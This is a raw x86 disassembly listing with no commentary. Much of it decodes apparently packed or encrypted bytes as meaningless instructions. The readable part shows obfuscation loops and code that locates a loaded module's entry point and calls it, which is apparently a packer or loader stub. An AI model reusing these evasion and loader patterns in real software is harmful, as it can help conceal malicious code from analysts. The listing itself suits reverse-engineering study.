  410f06:	jge    0x410ecd
  410f08:	int3   
  410f09:	lock or esp,DWORD PTR [ecx]
  410f0c:	call   0x2e9da848
  410f11:	and    edi,DWORD PTR [ebx]
  410f13:	dec    eax
  410f14:	jno    0x410f69
  410f16:	pop    ebx
  410f17:	jmp    0xeb5522a5
  410f1c:	imul   esi,DWORD PTR [ecx+ebp*2+0x4612c72c],0xffffffc0
  410f24:	sub    DWORD PTR [edx+eax*2],0x89672718
  410f2b:	inc    ebp
  410f2c:	inc    esp
  410f2d:	into   
  410f2e:	adc    eax,0x2cb21cc7
  410f33:	cmp    DWORD PTR [esi+0x78],ecx
  410f36:	pop    esi
  410f37:	es scas al,BYTE PTR es:[edi]
  410f39:	dec    eax
  410f3a:	out    0x63,eax
  410f3c:	lahf   
  410f3d:	(bad)  
  410f3e:	loopne 0x410fb2
  410f40:	inc    eax
  410f41:	shl    BYTE PTR [ecx+esi*2+0x51],cl
  410f45:	and    DWORD PTR [edx+0xb365f8],esp
  410f4b:	sbb    DWORD PTR [ecx+0x8c55aee],ecx
  410f51:	mov    ebx,0x4c450466
  410f56:	push   esp
  410f57:	inc    esi
  410f58:	(bad)  
  410f59:	dec    edx
  410f5a:	ret    
  410f5b:	pop    esi
  410f5c:	scas   al,BYTE PTR es:[edi]
  410f5d:	rol    ebp,0xf6
  410f60:	popf   
  410f61:	sbb    edi,edx
  410f63:	repnz xor ebx,DWORD PTR [esi+0x23a7681d]
  410f6a:	push   eax
  410f6b:	jae    0x410f09
  410f6d:	inc    eax
  410f6e:	fld1   
  410f70:	mov    WORD PTR [eax],?
  410f72:	cli    
  410f73:	inc    edx
  410f74:	add    BYTE PTR [edx+ebx*8],0x30
  410f78:	inc    ecx
  410f79:	lock imul edi,DWORD PTR [edx+0x707de45d],0x4c
  410f81:	hlt    
  410f82:	jecxz  0x410fbc
  410f84:	mov    eax,0x700f0e37
  410f89:	clc    
  410f8a:	aam    0x10
  410f8c:	xor    al,0x55
  410f8e:	out    0xb0,al
  410f90:	jae    0x410ffd
  410f92:	inc    ecx
  410f93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f94:	jle    0x410f8a
  410f96:	outs   dx,DWORD PTR ds:[esi]
  410f97:	mov    BYTE PTR [ebp-0x1b],ah
  410f9a:	popa   
  410f9b:	inc    eax
  410f9c:	arpl   bp,bp
  410f9e:	adc    al,0x76
  410fa0:	dec    edi
  410fa1:	jbe    0x41100d
  410fa3:	add    al,0x76
  410fa5:	jl     0x410f50
  410fa7:	cs cmp eax,0x2a556210
  410fad:	mov    eax,esi
  410faf:	stos   BYTE PTR es:[edi],al
  410fb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410fb1:	mov    dh,0x3c
  410fb3:	xchg   DWORD PTR [eax+0x19],esi
  410fb6:	sub    DWORD PTR [ebp-0x646ef271],0xffffffa6
  410fbd:	xor    dh,BYTE PTR [esi+0x70e34cee]
  410fc3:	jg     0x410f51
  410fc5:	jb     0x410fe2
  410fc7:	imul   ebx,DWORD PTR [edx-0x41e69db3],0xc824d568
  410fd1:	adc    ch,bh
  410fd3:	adc    DWORD PTR [eax-0x3e5b735a],edi
  410fd9:	mov    fs,WORD PTR [ebx-0x6880ab56]
  410fdf:	jnp    0x411005
  410fe1:	xchg   edi,eax
  410fe2:	cmp    BYTE PTR [ecx+0x10],ch
  410fe5:	js     0x410ff4
  410fe7:	addr16 dec esi
  410fe9:	mov    bl,0x95
  410feb:	out    0xc7,al
  410fed:	jmp    0x410f9e
  410fef:	xor    al,0xf4
  410ff1:	arpl   WORD PTR [eax+0x30e32f88],bp
  410ff7:	test   eax,0x637fb6ac
  410ffc:	jns    0x410fe1
  410ffe:	xchg   ebx,eax
  410fff:	pop    eax
  411000:	sbb    eax,DWORD PTR [esi]
  411002:	inc    esp
  411003:	jne    0x411047
  411005:	pop    ebp
  411006:	test   DWORD PTR [esp+edi*4+0x67c67f4a],ebx
  41100d:	out    0x42,eax
  41100f:	je     0x411043
  411011:	cmp    edx,DWORD PTR [eax-0x1c]
  411014:	push   esi
  411015:	pop    edx
  411016:	lds    ebx,FWORD PTR [ebx-0x72983e7f]
  41101c:	int    0xff
  41101e:	mov    esi,ecx
  411020:	xor    esi,eax
  411022:	add    esi,DWORD PTR [ebp+0x8]
  411025:	mov    DWORD PTR [ebp+0x8],esi
  411028:	mov    esi,DWORD PTR [ebp+0x8]
  41102b:	xor    esi,ecx
  41102d:	jmp    0x4112e9
  411032:	jo     0x41107c
  411034:	rsqrtps xmm6,XMMWORD PTR [edi]
  411037:	pop    ebp
  411038:	jge    0x4110ae
  41103a:	pop    ecx
  41103b:	mov    ebx,0x64814754
  411040:	out    0xc7,eax
  411042:	push   0x9d7e7e4f
  411047:	js     0x4110c7
  411049:	jle    0x4110b9
  41104b:	arpl   WORD PTR [eax+esi*2-0x7ca8c801],sp
  411052:	add    bh,al
  411054:	jg     0x4110bb
  411056:	sti    
  411057:	dec    esi
  411058:	bound  ebx,QWORD PTR [edi]
  41105a:	fld    TBYTE PTR [ebp+0xf]
  41105d:	xchg   esp,eax
  41105e:	loopne 0x41102f
  411060:	shl    DWORD PTR [ebp-0x67],0x78
  411064:	or     esi,DWORD PTR [eax-0x2d4ed177]
  41106a:	mov    ecx,0x75406d11
  41106f:	jle    0x4110cf
  411071:	fldcw  WORD PTR [esi+0x53]
  411074:	mov    esi,0x75b49e59
  411079:	cmp    DWORD PTR [ebx],esp
  41107b:	and    bh,BYTE PTR [ebx+ebp*8-0x7f04d49f]
  411082:	fmul   QWORD PTR [eax+edx*8]
  411085:	call   0x9010db84
  41108a:	cs pop edx
  41108c:	ret    
  41108d:	popf   
  41108e:	and    eax,0xb61216f1
  411093:	or     esp,0xffffffd6
  411096:	data16 mov ds:0x8f39bd65,al
  41109c:	test   DWORD PTR [edi+0x33],esi
  41109f:	add    BYTE PTR [edi+0x15],dh
  4110a2:	(bad)  
  4110a3:	xchg   edx,eax
  4110a4:	repz pop edx
  4110a6:	fcomp  DWORD PTR [ebp+eax*8+0x4a092568]
  4110ad:	adc    BYTE PTR [edi-0x4eced608],dl
  4110b3:	dec    esi
  4110b4:	daa    
  4110b5:	xchg   esp,eax
  4110b6:	out    dx,al
  4110b7:	sub    eax,0xa9e04d35
  4110bc:	dec    eax
  4110bd:	pushf  
  4110be:	xor    eax,0x748dbb97
  4110c3:	pop    ebx
  4110c4:	fwait
  4110c5:	aam    0xc9
  4110c7:	int    0x27
  4110c9:	mov    eax,0xc6c3c0dd
  4110ce:	mov    eax,ds:0x9a64b6de
  4110d3:	inc    edx
  4110d4:	repz adc al,0x11
  4110d7:	je     0x4110df
  4110d9:	sub    BYTE PTR [ebx],0x43
  4110dc:	ja     0x4110c7
  4110de:	xor    ah,BYTE PTR [eax+0x7e6286e4]
  4110e4:	in     al,dx
  4110e5:	out    0x5,al
  4110e7:	(bad)  
  4110e8:	not    BYTE PTR [ecx+0x56e90b3]
  4110ee:	mul    DWORD PTR [esi+0x16]
  4110f1:	push   esi
  4110f2:	mov    ds:0x61560917,eax
  4110f7:	jg     0x411129
  4110f9:	imul   esi,DWORD PTR [ebx],0x8f35e584
  4110ff:	lods   eax,DWORD PTR ds:[esi]
  411100:	repz pop es
  411102:	enter  0x8a59,0x10
  411106:	stc    
  411107:	jno    0x411125
  411109:	inc    edi
  41110a:	jae    0x411135
  41110c:	dec    edx
  41110d:	lods   eax,DWORD PTR ds:[esi]
  41110e:	inc    ebp
  41110f:	in     eax,0x1e
  411111:	inc    ecx
  411112:	lahf   
  411113:	loop   0x4110d2
  411115:	aaa    
  411116:	scas   eax,DWORD PTR es:[edi]
  411117:	fld    DWORD PTR [edi+edx*8-0x29]
  41111b:	aad    0x17
  41111d:	leave  
  41111e:	in     al,dx
  41111f:	fwait
  411120:	xor    BYTE PTR [ebx+0x1],bl
  411123:	and    BYTE PTR [edi-0x7e5723f3],dl
  411129:	lea    edx,[edx-0x2ffccf68]
  41112f:	in     al,0xae
  411131:	cmp    ebp,0x19efb1df
  411137:	jl     0x411149
  411139:	imul   BYTE PTR [eax-0x6a17ecf0]
  41113f:	ja     0x41119e
  411141:	dec    edx
  411142:	inc    ebp
  411143:	(bad)  
  411144:	in     al,0x62
  411146:	cli    
  411147:	push   ebp
  411148:	ins    DWORD PTR es:[edi],dx
  411149:	retf   0xe865
  41114c:	jp     0x411146
  41114e:	out    0xb1,eax
  411150:	push   ss
  411151:	sub    al,dh
  411153:	(bad)  
  411154:	dec    ecx
  411155:	dec    eax
  411156:	faddp  st(5),st
  411158:	int    0x2a
  41115a:	cmc    
  41115b:	in     eax,0x6b
  41115d:	sahf   
  41115e:	sbb    al,0x38
  411160:	clc    
  411161:	(bad)  
  411162:	aam    0x60
  411164:	daa    
  411165:	leave  
  411166:	sub    al,0x1e
  411168:	popf   
  411169:	sbb    al,cl
  41116b:	xchg   esp,eax
  41116c:	sub    edi,ecx
  41116e:	repz call 0xb22e:0x1b13ac4c
  411176:	sub    dl,0xd9
  411179:	je     0x411123
  41117b:	mov    ah,0x1c
  41117d:	add    dl,BYTE PTR [eax]
  41117f:	xor    DWORD PTR [ecx+edi*2+0x76],ebx
  411183:	int3   
  411184:	mov    al,ds:0x5e268649
  411189:	push   eax
  41118a:	rcr    BYTE PTR [edx],0x10
  41118d:	cli    
  41118e:	push   esp
  41118f:	pop    es
  411190:	dec    edx
  411191:	or     eax,esp
  411193:	pop    edi
  411194:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411195:	pop    esp
  411196:	loopne 0x41118d
  411198:	xor    BYTE PTR [eax],bl
  41119a:	popf   
  41119b:	mov    ebp,0x2553f575
  4111a0:	adc    ebx,DWORD PTR [ebx]
  4111a2:	push   ebx
  4111a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4111a4:	xor    BYTE PTR ds:0x1edac57a,al
  4111aa:	sub    al,0xc3
  4111ac:	sub    BYTE PTR [edi+0x76b7dde1],cl
  4111b2:	bound  eax,QWORD PTR [ebx-0x7]
  4111b5:	les    esp,FWORD PTR [esi-0x20a44a45]
  4111bb:	aas    
  4111bc:	mov    WORD PTR [eax+0x1a3631d9],cs
  4111c2:	sahf   
  4111c3:	sub    DWORD PTR [edi],ebp
  4111c5:	sbb    DWORD PTR [ebx-0x7f],esp
  4111c8:	je     0x4111dd
  4111ca:	test   eax,0x85fd5d1f
  4111cf:	mov    ecx,0x512bb9ae
  4111d4:	in     eax,dx
  4111d5:	pop    edx
  4111d6:	or     eax,0x71d98d10
  4111db:	push   edx
  4111dc:	daa    
  4111dd:	mov    cl,0x4
  4111df:	mov    ds:0xfe058384,eax
  4111e4:	cmp    eax,0x57693e58
  4111e9:	gs clc 
  4111eb:	adc    eax,0xfb8d61c9
  4111f0:	pop    ebp
  4111f1:	icebp  
  4111f2:	mov    esp,0xf94d1cbd
  4111f7:	mov    BYTE PTR [ecx-0x31],0x3
  4111fb:	call   DWORD PTR ds:0x2bfd2b77
  411201:	xchg   BYTE PTR ds:0xb0612fcd,dl
  411207:	shr    BYTE PTR [ebp+0xf],1
  41120a:	push   cs
  41120b:	in     al,dx
  41120c:	mov    WORD PTR [eax+0x9],fs
  41120f:	xchg   edx,eax
  411210:	lods   eax,DWORD PTR ds:[esi]
  411211:	sub    DWORD PTR [edx-0x7f8a149d],esp
  411217:	mov    ebp,0xed4da39c
  41121c:	cmp    eax,0xb0d8c5c9
  411221:	or     dl,BYTE PTR [ecx-0x7a]
  411224:	sbb    ah,ah
  411226:	jmp    0x8b4195e6
  41122b:	inc    ebp
  41122c:	push   edx
  41122d:	mov    ah,0x55
  41122f:	ret    
  411230:	xchg   ecx,eax
  411231:	mov    bh,0xc0
  411233:	pop    ebx
  411234:	fisttp DWORD PTR [ebp+0x58a7df25]
  41123a:	imul   esp,ecx,0xd6825e87
  411240:	out    0x92,al
  411242:	pusha  
  411243:	and    ebx,ebx
  411245:	iret   
  411246:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411247:	test   al,0xf
  411249:	scas   eax,DWORD PTR es:[edi]
  41124a:	xor    BYTE PTR [esi+0x15ce81d3],ah
  411250:	(bad)  
  411251:	fsub   QWORD PTR [edi-0x61]
  411254:	add    esi,DWORD PTR [edi+0x42]
  411257:	mov    ah,0x94
  411259:	xchg   ecx,eax
  41125a:	pop    esi
  41125b:	rcr    eax,cl
  41125d:	in     al,dx
  41125e:	pop    esp
  41125f:	adc    BYTE PTR [ecx+0x47b56c26],bh
  411265:	add    bl,BYTE PTR [ebp*1-0xc97e549]
  41126c:	fnsave [esi-0x5d5a144d]
  411272:	ret    
  411273:	sbb    BYTE PTR [edi],dl
  411275:	xchg   esi,eax
  411276:	inc    esp
  411277:	add    BYTE PTR [edi],bl
  411279:	sbb    edi,ebp
  41127b:	lock xchg DWORD PTR [edi+ebx*4],esp
  41127f:	xor    eax,0xdb1bcfd0
  411284:	lods   eax,DWORD PTR ds:[esi]
  411285:	rol    BYTE PTR [edi-0x4d],1
  411288:	aas    
  411289:	push   eax
  41128a:	and    DWORD PTR [ecx+0x76a83b5f],eax
  411290:	inc    edx
  411291:	inc    esp
  411292:	cdq    
  411293:	dec    ebp
  411294:	ins    BYTE PTR es:[edi],dx
  411295:	pop    ds
  411296:	mov    ebp,0xc1eafb2f
  41129b:	loopne 0x411261
  41129d:	clc    
  41129e:	retf   
  41129f:	adc    esp,eax
  4112a1:	jecxz  0x411282
  4112a3:	out    0x3a,al
  4112a5:	inc    edx
  4112a6:	sub    BYTE PTR [ebx-0x38],dl
  4112a9:	mov    ch,0x54
  4112ab:	jmp    0x329f2599
  4112b0:	retf   0xa7fc
  4112b3:	js     0x41131e
  4112b5:	mov    ?,WORD PTR [ebx+eiz*8-0x4dc6144]
  4112bc:	fwait
  4112bd:	dec    ebp
  4112be:	into   
  4112bf:	(bad)  
  4112c0:	push   cs
  4112c1:	call   0x674:0x9560a9ec
  4112c8:	fwait
  4112c9:	xlat   BYTE PTR ds:[ebx]
  4112ca:	sub    BYTE PTR [edi+0x1fa12d5d],dl
  4112d0:	outs   dx,BYTE PTR ds:[esi]
  4112d1:	jmp    0xa8156910
  4112d6:	cmp    eax,0x18b42030
  4112db:	xor    ch,BYTE PTR [esp+edx*2+0xb]
  4112df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4112e0:	pop    ecx
  4112e1:	ret    0x4605
  4112e4:	xchg   edx,eax
  4112e5:	push   es
  4112e6:	test   al,0xef
  4112e8:	dec    ebp
  4112e9:	xor    esi,eax
  4112eb:	mov    eax,DWORD PTR [edx+0x194]
  4112f1:	mov    ecx,DWORD PTR [eax]
  4112f3:	mov    eax,DWORD PTR [ecx+0x3c]
  4112f6:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  4112fa:	add    eax,ecx
  4112fc:	mov    DWORD PTR [ebp+0x8],esi
  4112ff:	mov    DWORD PTR [ebp+0x10],eax
  411302:	mov    eax,DWORD PTR [ebp+0x10]
  411305:	pop    esi
  411306:	test   eax,eax
  411308:	je     0x41132c
  41130e:	push   DWORD PTR ds:0x414bd6
  411314:	push   DWORD PTR ds:0x414982
  41131a:	mov    eax,DWORD PTR [edx+0x194]
  411320:	push   DWORD PTR [eax]
  411322:	mov    eax,DWORD PTR [ebp+0x10]
  411325:	call   eax
  411327:	jmp    0x41132f
  41132c:	mov    eax,DWORD PTR [ebp+0x10]
  41132f:	leave  
  411330:	ret    0xc
  411333:	push   ebp
  411334:	mov    ebp,esp
  411336:	sub    esp,0x30
  411339:	mov    DWORD PTR [ebp-0x4],0xf89c8536
  411340:	mov    ecx,DWORD PTR ds:0x434783
  411346:	xor    DWORD PTR ds:0x43474f,ecx
  41134c:	mov    DWORD PTR [ebp-0x18],0xf89c8539
  411353:	mov    DWORD PTR ds:0x43467f,0x14
  41135d:	cmp    DWORD PTR ds:0x43467f,0x0
  411364:	je     0x4113b9
  41136a:	cmp    DWORD PTR ds:0x43467f,0x3
  411371:	jne    0x411387
  411377:	push   0x4348fa
  41137c:	push   0x400000
  411381:	call   DWORD PTR ds:0x4130d8
  411387:	cmp    DWORD PTR ds:0x43467f,0x4
  41138e:	jne    0x41139f
  411394:	mov    eax,ds:0x43467f
  411399:	dec    eax
  41139a:	mov    ds:0x43467f,eax
  41139f:	mov    eax,ds:0x43467f
  4113a4:	dec    eax
  4113a5:	mov    ds:0x43467f,eax
  4113aa:	jmp    0x41135d
  4113af:	adc    DWORD PTR ds:0x43466f,0x46ae
  4113b9:	mov    ecx,DWORD PTR [ebp-0x4]
  4113bc:	and    DWORD PTR ds:0x4346c3,0x0
  4113c6:	jmp    0x4113d6
  4113cb:	mov    eax,ds:0x4346c3
  4113d0:	inc    eax
  4113d1:	mov    ds:0x4346c3,eax
  4113d6:	cmp    DWORD PTR ds:0x4346c3,0x18
  4113dd:	jae    0x411423
  4113e3:	cmp    DWORD PTR ds:0x4346c3,0xf
  4113ea:	jne    0x411406
  4113f0:	push   0x4346ff
  4113f5:	push   0x4743
  4113fa:	push   DWORD PTR [ebp-0x1c]
  4113fd:	push   DWORD PTR [ebp-0x10]
  411400:	call   DWORD PTR ds:0x4132ac
  411406:	cmp    DWORD PTR ds:0x4346c3,0xe
  41140d:	jne    0x41141e
  411413:	mov    eax,ds:0x4346c3
  411418:	inc    eax
  411419:	mov    ds:0x4346c3,eax
  41141e:	jmp    0x4113cb
  411423:	push   ebx
  411424:	mov    eax,0x7510851
  411429:	xor    ecx,eax
  41142b:	and    DWORD PTR ds:0x43478f,0x0
  411435:	mov    ebx,DWORD PTR ds:0x43478f
  41143b:	inc    ebx
  41143c:	mov    DWORD PTR ds:0x43478f,ebx
  411442:	cmp    DWORD PTR ds:0x43478f,0x6
  411449:	jne    0x411462
  41144f:	push   DWORD PTR [ebp-0x10]
  411452:	push   0x434713
  411457:	push   0x43485b
  41145c:	call   DWORD PTR ds:0x413360
  411462:	cmp    DWORD PTR ds:0x43478f,0x5
  411469:	jne    0x41147c
  41146f:	mov    ebx,DWORD PTR ds:0x43478f
  411475:	inc    ebx
  411476:	mov    DWORD PTR ds:0x43478f,ebx
  41147c:	cmp    DWORD PTR ds:0x43478f,0x10
  411483:	jb     0x411435
  411489:	movzx  ebx,WORD PTR ds:0x43465f
  411490:	adc    DWORD PTR ds:0x434747,ebx
  411496:	mov    ebx,0x327299
  41149b:	xor    DWORD PTR ds:0x434703,0x577
  4114a5:	add    ecx,ebx
  4114a7:	or     DWORD PTR ds:0x434783,0x434667
  4114b1:	mov    DWORD PTR [ebp-0x1c],ecx
  4114b4:	sbb    DWORD PTR ds:0x434753,edi
  4114ba:	mov    ecx,DWORD PTR [ebp+0x14]
  4114bd:	xor    DWORD PTR ds:0x434777,0x434673
  4114c7:	push   esi
  4114c8:	mov    DWORD PTR ds:0x43474b,0x24af
  4114d2:	push   edi
  4114d3:	sbb    DWORD PTR ds:0x43467f,0x4346bf
  4114dd:	test   ecx,ecx
  4114df:	je     0x41155f
  4114e5:	mov    ecx,DWORD PTR [ebp+0x14]
  4114e8:	sbb    DWORD PTR ds:0x434793,edx
  4114ee:	mov    ecx,DWORD PTR [ecx]
  4114f0:	and    DWORD PTR ds:0x43467f,0x0
  4114fa:	xor    edi,edi
  4114fc:	or     edi,DWORD PTR ds:0x43467f
  411502:	inc    edi
  411503:	mov    DWORD PTR ds:0x43467f,edi
  411509:	cmp    DWORD PTR ds:0x43467f,0xb
  411510:	jne    0x411529
  411516:	push   0x434787
  41151b:	push   DWORD PTR [ebp-0x28]
  41151e:	push   0x707e
  411523:	call   DWORD PTR ds:0x4132b0
  411529:	cmp    DWORD PTR ds:0x43467f,0xa
  411530:	jne    0x411545
  411536:	xor    edi,edi
  411538:	add    edi,DWORD PTR ds:0x43467f
  41153e:	inc    edi
  41153f:	mov    DWORD PTR ds:0x43467f,edi
  411545:	cmp    DWORD PTR ds:0x43467f,0x14
  41154c:	jb     0x4114fa
  411552:	mov    DWORD PTR ds:0x434667,0x18c9
  41155c:	mov    DWORD PTR [ebp-0x1c],ecx
  41155f:	mov    DWORD PTR ds:0x434677,0x1a
  411569:	cmp    DWORD PTR ds:0x434677,0x0
  411570:	je     0x4115ca
  411576:	cmp    DWORD PTR ds:0x434677,0xb
  41157d:	jne    0x411592
  411583:	push   DWORD PTR [ebp-0x14]
  411586:	push   DWORD PTR [ebp-0x14]
  411589:	push   DWORD PTR [ebp-0x14]
  41158c:	call   DWORD PTR ds:0x4130dc
  411592:	cmp    DWORD PTR ds:0x434677,0xc
  411599:	jne    0x4115ac
  41159f:	mov    edi,DWORD PTR ds:0x434677
  4115a5:	dec    edi
  4115a6:	mov    DWORD PTR ds:0x434677,edi
  4115ac:	mov    edi,DWORD PTR ds:0x434677
  4115b2:	dec    edi
  4115b3:	mov    DWORD PTR ds:0x434677,edi
  4115b9:	jmp    0x411569
  4115be:	mov    ecx,DWORD PTR ds:0x43466b
  4115c4:	adc    DWORD PTR ds:0x434663,ecx
  4115ca:	imul   edx,eax
  4115cd:	mov    ecx,0x4573
  4115d2:	mov    DWORD PTR ds:0x43478b,0x1d
  4115dc:	cmp    DWORD PTR ds:0x43478b,0x0
  4115e3:	je     0x41162d
  4115e9:	cmp    DWORD PTR ds:0x43478b,0xc
  4115f0:	jne    0x4115ff
  4115f6:	push   DWORD PTR [ebp-0x1c]
  4115f9:	call   DWORD PTR ds:0x4130e0
  4115ff:	cmp    DWORD PTR ds:0x43478b,0xd
  411606:	jne    0x41161b
  41160c:	xor    edi,edi
  41160e:	xor    edi,DWORD PTR ds:0x43478b
  411614:	dec    edi
  411615:	mov    DWORD PTR ds:0x43478b,edi
  41161b:	mov    edi,DWORD PTR ds:0x43478b
  411621:	dec    edi
  411622:	mov    DWORD PTR ds:0x43478b,edi
  411628:	jmp    0x4115dc
  41162d:	add    edx,ecx
  41162f:	jmp    0x41182f
  411634:	rol    DWORD PTR [edi+0x7d4a654a],cl
  41163a:	std    
  41163b:	mov    cl,0xe9
  41163d:	xchg   ebp,eax
  41163e:	inc    edx
  41163f:	jg     0x4115ea
  411641:	div    DWORD PTR ds:0x7e4a8f14
  411647:	jle    0x4116a2
  411649:	jg     0x4116c9
  41164b:	jle    0x41167a
  41164d:	leave  
  41164e:	and    edx,DWORD PTR [ecx]
  411650:	mov    al,ds:0x9f7e6bc6
  411655:	pop    ecx
  411656:	sub    DWORD PTR [esi+0x5c],edx
  411659:	mov    ch,0x5d
  41165b:	ins    DWORD PTR es:[edi],dx
  41165c:	mov    ah,0x60
  41165e:	mov    al,ds:0xfd284195
  411663:	push   eax
  411664:	xchg   esi,eax
  411665:	add    al,0x8f
  411667:	sar    BYTE PTR [ebp-0x70],cl
  41166a:	sub    dh,al
  41166c:	into   
  41166d:	stc    
  41166e:	pusha  
  41166f:	pop    edx
  411670:	pop    esp
  411671:	dec    eax
  411672:	(bad)  
  411674:	or     DWORD PTR [esi-0x53dcc802],eax
  41167a:	loop   0x411607
  41167c:	sub    esp,ecx
  41167e:	push   ebp
  411680:	mov    ?,WORD PTR [esi+0x72]
  411683:	scas   eax,DWORD PTR es:[edi]
  411684:	fs lock mov edx,0x5d5912b1
  41168b:	cmp    esp,DWORD PTR [edi]
  41168d:	jno    0x411629
  41168f:	pop    edx
  411690:	jo     0x411698
  411692:	add    al,0xb9
  411694:	sbb    DWORD PTR [eax-0x7a],ebp
  411697:	out    dx,al
  411698:	pop    esp
  411699:	mov    ds:0x14419d91,al
  41169e:	push   esp
  41169f:	add    al,0x31
  4116a1:	rol    BYTE PTR [ebp-0x38],cl
  4116a4:	movaps xmm6,XMMWORD PTR [edi-0x67]
  4116a8:	cmp    BYTE PTR [ecx-0x28823d4e],bh
  4116ae:	inc    esp
  4116af:	fistp  QWORD PTR [ebx]
  4116b1:	mov    edi,0x79f14410
  4116b6:	xchg   ch,bh
  4116b8:	sbb    eax,DWORD PTR [ecx]
  4116ba:	adc    DWORD PTR [ecx+0x6e],ebx
  4116bd:	jle    0x4116ca
  4116bf:	and    DWORD PTR [ecx],edi
  4116c1:	scas   eax,DWORD PTR es:[edi]
  4116c2:	or     al,0xea
  4116c4:	sbb    DWORD PTR [ebx+0x3d],edx
  4116c7:	nop
  4116c8:	xchg   edi,eax
  4116c9:	sbb    eax,0x33eeb23b
  4116ce:	mov    ds:0x6efc64d8,eax
  4116d3:	lods   eax,DWORD PTR ds:[esi]
  4116d4:	(bad)  
  4116d5:	mov    edx,0xb141c7fd
  4116da:	stc    
  4116db:	xor    edx,esi
  4116dd:	test   al,0x19
  4116df:	aaa    
  4116e0:	aad    0xe2
  4116e2:	(bad)  
  4116e3:	bound  ebp,QWORD PTR [edx+0x4f]
  4116e6:	sbb    al,0x86
  4116e8:	inc    edx
  4116e9:	jge    0x4116cb
  4116eb:	data16 imul BYTE PTR [eax+0x78f22993]
  4116f2:	or     al,0x48
  4116f4:	dec    esi
  4116f5:	fs cld 
  4116f7:	push   ss
  4116f8:	out    0xd1,eax
  4116fa:	jp     0x4116ca
  4116fc:	in     al,dx
  4116fd:	jae    0x41174f
  4116ff:	out    dx,al
  411700:	(bad)  [ecx+0x25]
  411703:	and    BYTE PTR [eax],dl
  411705:	push   edx
  411706:	(bad)  
  411707:	retf   0xd6a5
  41170a:	retf   0x7b28
  41170d:	cmp    BYTE PTR [edi-0x2c5cde77],al
  411713:	loope  0x411756
  411715:	xor    DWORD PTR [ebx],0xffffff90
  411718:	xor    al,0x67
  41171a:	popa   
  41171b:	pop    es
  41171c:	sbb    bl,dl
  41171e:	retf   0x1cd5
  411721:	mov    al,ah
  411723:	dec    edi
  411724:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411725:	leave  
  411726:	out    dx,al
  411727:	test   DWORD PTR [ecx+0x54],0x90693b65
  41172e:	adc    DWORD PTR [esi-0x5c],eax
  411731:	shl    DWORD PTR ds:0x39333c25,0x4e
  411738:	push   ecx
  411739:	ins    BYTE PTR es:[edi],dx
  41173a:	ficom  WORD PTR [ebp-0x1b954f8e]
  411740:	xor    eax,0xb928b944
  411745:	push   ebx
  411746:	jo     0x411782
  411748:	add    al,0xed
  41174a:	hlt    
  41174b:	push   esi
  41174c:	jne    0x4117aa
  41174e:	xor    bl,ah
  411750:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411751:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411752:	cmp    ebp,DWORD PTR [ebx-0x43]
  411755:	add    dh,BYTE PTR [edi]
  411757:	inc    esp
  411758:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411759:	push   0xffffff9a
  41175b:	push   ebp
  41175c:	dec    esi
  41175d:	fcom   QWORD PTR [ebp-0x1abbf5a8]
  411763:	in     al,dx
  411764:	xchg   esi,eax
  411765:	aam    0x93
  411767:	mov    cl,0xab
  411769:	retf   0xbf11
  41176c:	outs   dx,DWORD PTR ds:[esi]
  41176d:	xchg   esp,eax
  41176e:	(bad)  
  41176f:	sub    ebp,edx
  411771:	in     al,0xef
  411773:	ret    
  411774:	jmp    0x42a2:0x169e15a8
  41177b:	loope  0x4117ea
  41177d:	pop    ebp
  41177e:	push   esp
  41177f:	test   cl,ah
  411781:	lahf   
  411782:	push   ecx
  411783:	pop    ebx
  411784:	add    esp,DWORD PTR [ecx+0x69b1180d]
  41178a:	loope  0x41173c
  41178c:	ins    BYTE PTR es:[edi],dx
  41178d:	sub    edi,DWORD PTR [ebx+0x51]
  411790:	iret   
  411791:	retf   
  411792:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411793:	(bad)  
  411794:	cmp    al,BYTE PTR [ebp+0x2d27863f]
  41179a:	jae    0x41173a
  41179c:	ins    BYTE PTR es:[edi],dx
  41179d:	mov    bl,0xae
  41179f:	dec    ecx
  4117a0:	ret    
  4117a1:	ret    
  4117a2:	and    BYTE PTR [esi],ah
  4117a4:	ins    BYTE PTR es:[edi],dx
  4117a5:	inc    eax
  4117a6:	push   ss
  4117a7:	sub    DWORD PTR [ecx+ebx*8+0x2],esi
  4117ab:	jmp    0x1090:0x43fbd30c
  4117b2:	push   0x62
  4117b4:	scas   al,BYTE PTR es:[edi]
  4117b5:	ds push es
  4117b7:	mov    ebp,DWORD PTR [ebx+0x39]
  4117ba:	jmp    0x41b51003
  4117bf:	sti    
  4117c0:	xlat   BYTE PTR cs:[ebx]
  4117c2:	xchg   ebp,eax
  4117c3:	pop    ss
  4117c4:	std    
  4117c5:	push   cs
  4117c6:	mov    eax,0x13ea4f02
  4117cb:	xor    BYTE PTR [ecx],bh
  4117cd:	or     al,0xbd
  4117cf:	arpl   ax,bp
  4117d1:	mov    dl,0xe2
  4117d3:	ss retf 0xda5f
  4117d7:	call   0x8004b04b
  4117dc:	aad    0x5
  4117de:	xchg   ecx,eax
  4117df:	mov    eax,ds:0x5458096a
  4117e4:	add    DWORD PTR [edx+ebx*4-0x3],ebx
  4117e8:	outs   dx,DWORD PTR ds:[esi]
  4117e9:	popa   
  4117ea:	nop
  4117eb:	pop    edi
  4117ec:	out    dx,eax
  4117ed:	mov    cl,0xc8
  4117ef:	jno    0x4117b2
  4117f1:	pop    ebx
  4117f2:	mov    cl,0x3c
  4117f4:	push   0x34
  4117f6:	je     0x4117f9
  4117f8:	pop    esi
  4117f9:	xor    BYTE PTR [edi+0x25],bl
  4117fc:	ins    DWORD PTR es:[edi],dx
  4117fd:	fisubr DWORD PTR [edx]
  4117ff:	mov    DWORD PTR [eax+ebp*1],ecx
  411802:	sbb    bl,al
  411804:	mov    BYTE PTR [ecx+eiz*8-0x4180cbe0],ch
  41180b:	sbb    esi,DWORD PTR [ebp+0x35]
  41180e:	lods   al,BYTE PTR ds:[esi]
